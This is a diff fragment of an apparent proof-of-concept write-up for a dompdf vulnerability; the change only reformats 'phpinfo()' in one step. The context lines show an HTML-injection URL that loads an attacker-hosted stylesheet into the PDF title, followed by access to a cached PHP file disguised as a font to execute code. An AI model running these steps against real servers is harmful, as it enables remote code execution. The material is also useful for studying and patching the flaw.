@@ -25,7 +25,7 @@ $ php -S localhost:9001
 http://localhost:9000/index.php?pdf&title=<link rel=stylesheet href='http://localhost:9001/exploit.css'>
 ```
 
-4. Access the cached php "font" file and execute phpinfo()
+4. Access the cached php "font" file and execute `phpinfo()`
 ```
 http://localhost:9000/dompdf/lib/fonts/exploitfont_normal_3f83639933428d70e74a061f39009622.php
 ```
